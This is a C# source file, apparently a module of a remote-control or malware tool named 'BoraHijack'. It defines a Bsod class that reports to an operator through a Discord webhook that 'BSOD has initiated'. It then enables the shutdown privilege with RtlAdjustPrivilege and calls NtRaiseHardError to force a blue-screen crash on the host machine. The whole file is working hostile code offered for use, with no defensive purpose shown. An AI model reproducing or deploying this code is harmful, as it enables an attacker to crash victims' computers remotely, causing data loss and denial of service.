using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using Discord;
using Discord.Webhook;
using BoraHijack;

namespace BoraHijack.Fun
{
    public class Bsod
    {
        [DllImport("ntdll.dll")]
        static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

        [DllImport("ntdll.dll")]
        static extern int NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters,
            uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        public static async Task BSODAlert(string webhookUrl)
        {
            try
            {
                var client = new DiscordWebhookClient(webhookUrl);
                await client.SendMessageAsync(
                    text: "",
                    username: "BoraHijack",
                    avatarUrl: "https://files.catbox.moe/zteeqk.png",
                    isTTS: false,
                    embeds: new[] {
                    new EmbedBuilder()
                    .WithTitle("BSOD :)")
                    .WithDescription("BSOD has initiated.")
                    .WithColor(Color.Blue)
                    .WithFooter("Made By vanity (v1s0or)")
                    .WithCurrentTimestamp()
                    .Build()
                    });

                TriggerBSOD();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private static void TriggerBSOD()
        {
            bool enabled;
            uint response;

            RtlAdjustPrivilege(19, true, false, out enabled); // SeShutdownPrivilege
            NtRaiseHardError(0xDEAD, 0, 0, IntPtr.Zero, 6, out response);
        }
    }
}